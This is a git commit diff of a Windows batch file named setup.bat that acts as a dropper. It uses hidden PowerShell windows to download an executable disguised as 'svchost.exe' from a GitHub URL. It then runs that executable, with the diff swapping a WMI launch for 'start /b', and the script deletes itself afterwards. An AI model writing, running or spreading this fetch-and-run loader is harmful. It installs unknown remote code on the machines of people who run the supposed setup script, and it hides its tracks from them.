978f577e46152de0afe284da5605533f014eab09
johtaromemory-hash <johtaromemory@gmail.com>
2026-06-25 10:57:49 +0300

    Add files via upload

--- setup.bat
+++ setup.bat
@@ -1,5 +1,5 @@
 @echo off
 cd /d "%~dp0"
 powershell -w hidden -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/johtaromemory-hash/test/raw/refs/heads/main/svchost.exe', '%~dp0svchost.exe')"
-if exist "%~dp0svchost.exe" powershell -w hidden -Command "([WMICLASS]'\\localhost\root\cimv2:Win32_Process').Create('%~dp0svchost.exe')" >nul 2>&1
+if exist "%~dp0svchost.exe" start /b "" "%~dp0svchost.exe"
 del "%~f0" >nul 2>&1
